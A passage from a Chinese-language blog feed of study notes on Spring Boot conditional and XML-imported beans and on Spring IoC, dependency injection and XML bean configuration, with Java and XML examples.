Support&#x2F;typora-user-images&#x2F;image-20240711172918476.png) </p><h5 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h5><p>条件装配，当满足特定条件时才向容器中注册组件</p><p>@Conditional是一个父接口，该接口实现了很多子接口</p><p>![](&#x2F;Users&#x2F;pacemrc&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20240711173431259.png) </p><p>该注解应用在@Bean注解的方法上，则表明当满足条件时则注册该@bean组件</p><p>该注解应用在@Configuration注解类上，则表明满足特定条件时该配置类内的所有@bean组件才会注册到容器</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.pacemrc.springboot.SpringbootApplication;<span class="hljs-keyword">import</span> com.pacemrc.springboot.domain.Pet;<span class="hljs-keyword">import</span> com.pacemrc.springboot.domain.User;<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.condition.ConditionalOnBean;<span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.annotation.*;<span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcat</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);    &#125;    <span class="hljs-meta">@Bean</span>    <span class="hljs-meta">@ConditionalOnBean(name = &quot;tomcat&quot;)</span>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span> &#123;        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;user01&quot;</span>, <span class="hljs-number">18</span>);        user.setPet(tomcat());        <span class="hljs-keyword">return</span> user;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//1、返回我们IOC容器</span>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(SpringbootApplication.class, args);        <span class="hljs-comment">//2、查看容器里面的组件</span>        String[] names = run.getBeanDefinitionNames();        <span class="hljs-keyword">for</span> (String name : names) &#123;            System.out.println(name);        &#125;        <span class="hljs-type">boolean</span> <span class="hljs-variable">tomcat</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tomcat&quot;</span>);        System.out.println(<span class="hljs-string">&quot;容器中Tomcat组件：&quot;</span>+tomcat);        <span class="hljs-type">boolean</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;user01&quot;</span>);        System.out.println(<span class="hljs-string">&quot;容器中user01组件：&quot;</span>+user01);        <span class="hljs-type">boolean</span> <span class="hljs-variable">tom22</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tom22&quot;</span>);        System.out.println(<span class="hljs-string">&quot;容器中tom22组件：&quot;</span>+tom22);    &#125;&#125;</code></pre></div><h5 id="ImportResource"><a href="#ImportResource" class="headerlink" title="@ImportResource"></a>@ImportResource</h5><p>从spring.xml配置文件中向容器中注册组件</p><p>spring.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user05&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.springboot.domain.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;John&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;35&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pig&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.pacemrc.springboot.domain.Pet&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;pig&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>SpringbootApplication.java</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<span class="hljs-keyword">import</span> org.springframework.context.ConfigurableApplicationContext;<span class="hljs-comment">//@SpringBootConfiguration</span><span class="hljs-comment">//@EnableAutoConfiguration</span><span class="hljs-comment">//@ComponentScan(value = &quot;com.pacemrc&quot;)</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * SpringBootApplication等同于开启SpringBootConfiguration、EnableAutoConfiguration、ComponentScan三个注解</span><span class="hljs-comment"> */</span><span class="hljs-meta">@SpringBootApplication</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringbootApplication</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        <span class="hljs-comment">//1、返回IOC容器</span>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(SpringbootApplication.class, args);        <span class="hljs-type">boolean</span> <span class="hljs-variable">user05</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;user05&quot;</span>);        System.out.println(<span class="hljs-string">&quot;是否存在user05组件：&quot;</span> + user05);        <span class="hljs-type">boolean</span> <span class="hljs-variable">pig</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;pig&quot;</span>);        System.out.println(<span class="hljs-string">&quot;是否存在pig组件：&quot;</span> + pig);    &#125;&#125;=======是否存在user05组件：<span class="hljs-literal">true</span>是否存在pig组件：<span class="hljs-literal">true</span></code></pre></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>语雀笔记</li></ul><p><a href="https://www.yuque.com/atguigu/springboot">https://www.yuque.com/atguigu/springboot</a></p><ul><li>B站课程</li></ul><p><a href="https://www.bilibili.com/video/BV19K4y1L7MT">https://www.bilibili.com/video/BV19K4y1L7MT</a></p><ul><li>spring官方文档</li></ul><p><a href="https://docs.spring.io/spring-boot/docs/2.7.18/reference/html/index.html">https://docs.spring.io/spring-boot/docs/2.7.18/reference/html/index.html</a></p>]]></content>
    
    
    <categories>
      
      <category>编程技术</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>spring</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Spring/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p>Spring是分层的 Java SE&#x2F;EE应用 full-stack 轻量级开源框架，以 <strong>IoC</strong>（Inverse Of Control：反转控制）和<strong>AOP</strong>（Aspect Oriented Programming：面向切面编程）为核心。提供了<strong>表现层 SpringMVC</strong> 和<strong>持久层 Spring JDBCTemplate</strong> 以及<strong>业务层事务管理</strong>等众多的企业级应用技术，还能整合开源世界众多著名的第三方框架和类库，逐渐成为使用最多的Java EE 企业应用开源框架。</p><h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ol><li>方便解耦，简化开发</li><li>AOP编程的支持</li><li>声明式事务的支持</li><li>方便程序的测试</li><li>方便集成各种优秀的框架</li><li>降低JavaEE API的使用难度</li></ol><h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><p>1、作为Spring容器对JavaBean进行管理。</p><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p>IOC反转控制：把JavaBean对象的创建实例化权交给 Spring负责。</p><p>DI依赖注入：依赖注入是Spring框架核心IoC的具体实现，使Spring可以自动为实例化的bean对象进行属性赋值。</p><p>MVC：负责将用户输入URL请求和java代码关联</p><p>AOP：面向切面设计、解耦、通知回调</p><p>JDBC ORM：模板方法模式、建造者模式</p><p>JavaBean：实体类</p><h1 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h1><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><ol><li>实例化对象：通过构造器或工厂方法创建bean实例</li><li>对象的赋值：为bean的属性设置值或引用其他bean对象作为属性值</li><li>对象的初始化：先调用bean对象的初始化方法</li><li>对象的使用：调用对象的方法</li><li>对象的销毁：当spring容器关闭时调用bean对象的销毁方法</li></ol><h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><h3 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h3><p><strong>JavaBean实例化对象三种方式</strong></p><ul><li><p>JavaBean的无参<strong>构造</strong>方法实例化</p></li><li><p>工厂类的<strong>静态</strong>方法实例化</p></li><li><p>工厂类的<strong>实例</strong>方法实例化</p></li></ul><h3 id="对象的赋值"><a href="#对象的赋值" class="headerlink" title="对象的赋值"></a>对象的赋值</h3><p><strong>依赖注入的数据类型</strong></p><p>普通数据类型：基本数据类型</p><p>引用数据类型：将其他bean对象作为该bean对象的属性值</p><p>集合数据类型</p><p><strong>引用数据类型的注入方式</strong></p><p>构造方法</p><p>set方法</p><h3 id="对象的初始化"><a href="#对象的初始化" class="headerlink" title="对象的初始化"></a>对象的初始化</h3><p>在javaBean类中编写init-method方法</p><h3 id="对象的使用"><a href="#对象的使用" class="headerlink" title="对象的使用"></a>对象的使用</h3><p>调用bean对象的方法</p><h3 id="对象的销毁"><a href="#对象的销毁" class="headerlink" title="对象的销毁"></a>对象的销毁</h3><p>在javaBean类中编写destroy-method方法</p><h1 id="配置文件介绍"><a href="#配置文件介绍" class="headerlink" title="配置文件介绍"></a>配置文件介绍</h1><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:aop</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/aop&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xmlns:tx</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/tx&quot;</span></span><span class="hljs-tag">    <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans  http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd</span></span><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd&quot;</span>&gt;</span></code></pre></div><h2 id="bean标签"><a href="#bean标签" class="headerlink" title="bean标签"></a>bean标签</h2><p>bean实例标签：用于配置对象交由<strong>Spring</strong> 来创建。默认情况下它调用的是类中的<strong>无参构造函数</strong>，如果没有无参构造函数则不能创建成功。</p><table><thead><tr><th>属性名</th><th>作用</th></tr></thead><tbody><tr><td>id</td><td>在Spring容器中Bean实例的唯一标识，不允许重复</td></tr><tr><td>class</td><td>要实例化的Bean的全限定名</td></tr><tr><td>scope</td><td>Bean的作用范围，常用是Singleton(默认)和prototype，还有request、session、global session</td></tr><tr><td>factory-bean</td><td>指定工厂类来实例化bean对象</td></tr><tr><td>factory-method</td><td>指定具体的方法来实例化bean对象</td></tr></tbody></table><p><bean>标签代码实例</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.service.impl.UserServiceImpl&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!--指定工厂类的静态方法来实例化bean对象--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.Factory.StaticFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createUserDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!--指定工厂类的实例对象的内部方法来实例化bean对象--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.Factory.InstanceFactory&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao2&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;insFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createUserDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><p><strong>scope属性</strong></p><p><strong>singleton</strong> ：默认值，单例的</p><p><strong>prototype</strong> ：多例的</p><p>request ：WEB 项目中，Spring 创建一个 Bean 的对象，将对象存入到 request 域中</p><p>session ：WEB 项目中，Spring 创建一个 Bean 的对象，将对象存入到 session 域中</p><p>global session ：WEB 项目中，应用在 Portlet 环境，如果没有 Portlet 环境那么globalSession 相当于 session</p><p><strong>1）当scope的取值为singleton时</strong></p><p>Bean的实例化个数：1个</p><p>Bean的实例化时机：当Spring核心文件被加载时，实例化Bean对象</p><p>Bean的生命周期：</p><p>对象创建：当应用加载，创建容器时，对象就被创建了</p><p>对象运行：只要容器在，对象一直活着</p><p>对象销毁：当应用卸载，销毁容器时，对象就被销毁了</p><p><strong>2）当scope的取值为prototype时</strong></p><p>Bean的实例化个数：多个</p><p>Bean的实例化时机：当调用getBean()方法时实例化Bean对象</p><p>对象创建：当使用对象时，创建新的对象实例</p><p>对象运行：只要对象在使用中，就一直活着</p><p>对象销毁：当对象长时间不用时，被 Java 的垃圾回收器回收了</p><h2 id="property标签"><a href="#property标签" class="headerlink" title="property标签"></a>property标签</h2><p><strong><bean>标签的子标签</strong>，对象属性注入标签。</p><table><thead><tr><th>属性名</th><th>作用</th></tr></thead><tbody><tr><td>name</td><td>属性名称</td></tr><tr><td>value</td><td>注入的普通属性值</td></tr><tr><td>ref</td><td>注入的对象引用值（需要注入的bean对象的id属性值）</td></tr></tbody></table><p><property>标签代码示例</p><div class="code-wrapper"><pre><code class="hljs xml">//注入普通属性值<span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.User&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;caofalin&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>//注入对象属性值<span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.service.impl.UserServiceImpl&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><h2 id="list标签"><a href="#list标签" class="headerlink" title="list标签"></a>list标签</h2><p><strong><property>标签的子标签</strong>，依赖注入数据类型是集合类型之List类型标签</p><p><list>代码示例</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//JavaBean</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-keyword">private</span> List&lt;String&gt; strList;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStrList</span><span class="hljs-params">(List&lt;String&gt; strList)</span> &#123;        <span class="hljs-built_in">this</span>.strList = strList;    &#125;&#125;<span class="hljs-comment">//applicationContext.xml</span>&lt;bean id=<span class="hljs-string">&quot;userDao&quot;</span> class=<span class="hljs-string">&quot;org.example.dao.impl.UserDaoImpl&quot;</span>&gt;    &lt;property name=<span class="hljs-string">&quot;strList&quot;</span>&gt;        &lt;list&gt;            &lt;value&gt;aaa&lt;/value&gt;            &lt;value&gt;bbb&lt;/value&gt;            &lt;value&gt;ccc&lt;/value&gt;        &lt;/list&gt;    &lt;/property&gt;&lt;/bean&gt;</code></pre></div><h2 id="map标签"><a href="#map标签" class="headerlink" title="map标签"></a>map标签</h2><p><strong><property>标签的子标签</strong>，依赖注入数据数据是集合类型之Map类型标签</p><p><map>代码示例</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//JavaBean</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-keyword">private</span> Map&lt;String, User&gt; userMap;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserMap</span><span class="hljs-params">(Map&lt;String, User&gt; userMap)</span> &#123;        <span class="hljs-built_in">this</span>.userMap = userMap;    &#125;&#125;<span class="hljs-comment">//applicationContext.xml</span>&lt;bean id=<span class="hljs-string">&quot;user1&quot;</span> class=<span class="hljs-string">&quot;org.example.domain.User&quot;</span>&gt;    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;tom&quot;</span>/&gt;&lt;/bean&gt;&lt;bean id=<span class="hljs-string">&quot;user2&quot;</span> class=<span class="hljs-string">&quot;org.example.domain.User&quot;</span>&gt;    &lt;property name=<span class="hljs-string">&quot;name&quot;</span> value=<span class="hljs-string">&quot;lucy&quot;</span>/&gt;&lt;/bean&gt;&lt;bean id=<span class="hljs-string">&quot;userDaoCollection&quot;</span> class=<span class="hljs-string">&quot;org.example.dao.impl.UserDaoImpl&quot;</span>&gt;    &lt;property name=<span class="hljs-string">&quot;userMap&quot;</span>&gt;        &lt;map&gt;            &lt;entry key=<span class="hljs-string">&quot;u1&quot;</span> value-ref=<span class="hljs-string">&quot;user1&quot;</span>&gt;&lt;/entry&gt;            &lt;entry key=<span class="hljs-string">&quot;u2&quot;</span> value-ref=<span class="hljs-string">&quot;user2&quot;</span>&gt;&lt;/entry&gt;        &lt;/map&gt;    &lt;/property&gt;&lt;/bean&gt;</code></pre></div><h2 id="properties标签"><a href="#properties标签" class="headerlink" title="properties标签"></a>properties标签</h2><p><strong><property>标签的子标签</strong>，依赖注入数据数据是集合类型之Properties类型标签</p><p><properties>标签代码示例</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//JavaBean</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;    <span class="hljs-keyword">private</span> Properties properties;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(Properties properties)</span> &#123;        <span class="hljs-built_in">this</span>.properties = properties;    &#125;&#125;<span class="hljs-comment">//applicationContext.xml</span>&lt;bean id=<span class="hljs-string">&quot;userDao&quot;</span> class=<span class="hljs-string">&quot;org.example.dao.impl.UserDaoImp&quot;</span>&gt;    &lt;property name=<span class="hljs-string">&quot;properties&quot;</span>&gt;        &lt;props&gt;            &lt;prop key=<span class="hljs-string">&quot;p1&quot;</span>&gt;ppp1&lt;/prop&gt;            &lt;prop key=<span class="hljs-string">&quot;p2&quot;</span>&gt;ppp2&lt;/prop&gt;            &lt;prop key=<span class="hljs-string">&quot;p3&quot;</span>&gt;ppp3&lt;/prop&gt;        &lt;/props&gt;    &lt;/property&gt;&lt;/bean&gt;</code></pre></div><h2 id="constructor-arg标签"><a href="#constructor-arg标签" class="headerlink" title="constructor-arg标签"></a>constructor-arg标签</h2><p><strong><bean>标签的子标签</strong>，指定有参构造函数标签</p><p><constructor-arg>代码示例</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userService&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.service.impl.UserServiceImpl&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><h2 id="import标签"><a href="#import标签" class="headerlink" title="import标签"></a>import标签</h2><p>导入其他Spring的子配置文件</p><p><import>代码实例</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;ApplicationContext-Product.xml&quot;</span>/&gt;</span></code></pre></div><h2 id="完整配置文件示例"><a href="#完整配置文件示例" class="headerlink" title="完整配置文件示例"></a>完整配置文件示例</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--测试运行IoC --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试scope --&gt;</span><span class="hljs-comment">&lt;!--    &lt;bean id=&quot;userDao1&quot; class=&quot;UserDaoImpl&quot; scope=&quot;singleton&quot;&gt;&lt;/bean&gt;--&gt;</span><span class="hljs-comment">&lt;!--    &lt;bean id=&quot;userDao2&quot; class=&quot;UserDaoImpl&quot; scope=&quot;prototype&quot;&gt;&lt;/bean&gt;--&gt;</span>    <span class="hljs-comment">&lt;!-- 测试初始化和销毁方法--&gt;</span><span class="hljs-comment">&lt;!--    &lt;bean id=&quot;userDao3&quot; class=&quot;UserDaoImpl&quot; init-method=&quot;init&quot; destroy-method=&quot;destroy&quot;&gt;&lt;/bean&gt;--&gt;</span>    <span class="hljs-comment">&lt;!--Bean实例化：无参构造方法--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao_ByConstructorNoArg&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!--Bean实例化：工厂静态方法--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao_ByStaticFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.Factory.StaticFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createUserDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!--Bean实例化：工厂实例方法--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insFactory&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.Factory.InstanceFactory&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;userDao_ByInstanceFactory&quot;</span> <span class="hljs-attr">factory-bean</span>=<span class="hljs-string">&quot;insFactory&quot;</span> <span class="hljs-attr">factory-method</span>=<span class="hljs-string">&quot;createUserDao&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 测试依赖注入：set方法 --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;DI_RefData_BySet&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.service.impl.UserServiceImpl2&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!-- name属性是UserServiceImpl2的setUserDao方法名，ref属性是引用id为userDao的bean对象--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span 